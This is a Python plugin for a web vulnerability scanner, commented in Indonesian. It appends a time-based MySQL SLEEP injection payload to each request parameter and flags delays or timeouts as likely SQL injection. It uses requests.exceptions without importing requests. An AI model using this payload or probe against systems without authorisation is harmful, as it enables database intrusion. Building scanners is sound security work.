from core.plugin_base import BasePlugin
import time

class TimeBasedSQLiPlugin(BasePlugin):
    NAME = "Time-based SQLi"
    PHASE = "phase1"
    # Payload untuk ' (single quote) dan delay 5 detik
    PAYLOAD = "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
    TIME_DELAY = 4 # Sedikit di bawah 5 untuk toleransi jaringan

    def test_vector(self, vector, session):
        method, url, params = vector
        test_params = params.copy()

        for param_name in test_params:
            # Hanya tes pada parameter yang memiliki nilai asli
            if not params[param_name]:
                continue

            original_value = params[param_name]
            test_params[param_name] = original_value + self.PAYLOAD

            try:
                start_time = time.time()
                if method == 'GET':
                    session.get(url, params=test_params, timeout=10, verify=False, allow_redirects=False)
                else: # POST
                    session.post(url, data=test_params, timeout=10, verify=False, allow_redirects=False)

                duration = time.time() - start_time

                if duration >= self.TIME_DELAY:
                    self.result_manager.log_vulnerability(
                        'SQL Injection (Time-based)', 'HIGH', url,
                        f"Potensi SQLi (delay {duration:.2f}d) di param {method}: {param_name}",
                        self.PAYLOAD
                    )
            except requests.exceptions.Timeout:
                # Timeout 10d terpicu, ini juga bisa jadi temuan
                self.result_manager.log_vulnerability(
                    'SQL Injection (Time-based)', 'HIGH', url,
                    f"Potensi SQLi (Request Timeout) di param {method}: {param_name}",
                    self.PAYLOAD
                )
            except Exception:
                pass